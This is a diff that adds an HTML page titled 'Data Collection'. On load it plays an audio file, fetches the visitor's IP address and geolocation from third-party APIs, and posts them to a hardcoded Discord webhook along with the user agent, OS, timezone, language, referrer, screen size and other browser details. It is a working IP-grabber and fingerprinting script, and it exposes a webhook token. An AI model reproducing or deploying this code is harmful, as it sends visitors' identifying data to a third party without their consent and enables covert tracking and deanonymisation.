@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Data Collection</title>
+</head>
+<body>
+    <h1>Collecting Data...</h1>
+    
+    <!-- Audio element -->
+    <audio id="audioElement" src="h.mp3"></audio>
+
+    <script>
+        // Function to detect the operating system
+        function getOS() {
+            const platform = navigator.platform.toLowerCase();
+            if (platform.includes('win')) return 'Windows';
+            if (platform.includes('mac')) return 'MacOS';
+            if (platform.includes('linux')) return 'Linux';
+            if (/android/.test(navigator.userAgent.toLowerCase())) return 'Android';
+            if (/iphone|ipad|ipod/.test(navigator.userAgent.toLowerCase())) return 'iOS';
+            return 'Unknown';
+        }
+
+        // Function to get the IP address and geolocation data
+        function getIPAddress(callback) {
+            const xhr = new XMLHttpRequest();
+            xhr.open('GET', 'https://api.ipify.org?format=json', true);
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState == 4 && xhr.status == 200) {
+                    const response = JSON.parse(xhr.responseText);
+                    const ip = response.ip;
+
+                    // Get geolocation data
+                    const geoXhr = new XMLHttpRequest();
+                    geoXhr.open('GET', `https://ipapi.co/${ip}/json/`, true);
+                    geoXhr.onreadystatechange = function() {
+                        if (geoXhr.readyState == 4 && geoXhr.status == 200) {
+                            const geoResponse = JSON.parse(geoXhr.responseText);
+                            const country = geoResponse.country_name;
+                            const continent = geoResponse.continent_code;
+                            callback(ip, country, continent);
+                        }
+                    };
+                    geoXhr.send();
+                }
+            };
+            xhr.send();
+        }
+
+        // Send the collected data to the Discord webhook
+        function sendData(ip, country, continent) {
+            const xhr = new XMLHttpRequest();
+            const url = 'https://discord.com/api/webhooks/1249043424020004865/iZguJoomM0MqkqlEf9lZKZ9eKJNgJGKTsjUzUSexCMOXXVjQ-Mh2uIGXQOmT9QQds3_s';
+            xhr.open('POST', url, true);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+
+            const data = JSON.stringify({
+                content: `IP Address: ${ip}
+Country: ${country}
+Continent: ${continent}
+Device: ${navigator.userAgent}
+Browser: ${navigator.appName}
+Screen Resolution: ${window.screen.width}x${window.screen.height}
+Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+Operating System: ${getOS()}
+Language: ${navigator.language}
+Cookies Enabled: ${navigator.cookieEnabled}
+Online Status: ${navigator.onLine}
+Java Enabled: ${navigator.javaEnabled()}
+Referrer: ${document.referrer}
+Platform: ${navigator.platform}
+Vendor: ${navigator.vendor}`
+            });
+
+            xhr.send(data);
+        }
+
+        // Play audio and collect IP address and geolocation data
+        window.onload = function() {
+            // Play the audio
+            const audioElement = document.getElementById('audioElement');
+            audioElement.play().catch(function(error) {
+                console.log("Audio playback failed: ", error);
+            });
+
+            // Collect IP address and then send all data
+            getIPAddress(function(ip, country, continent) {
+                sendData(ip, country, continent);
+            });
+        };
+    </script>
+</body>
+</html>
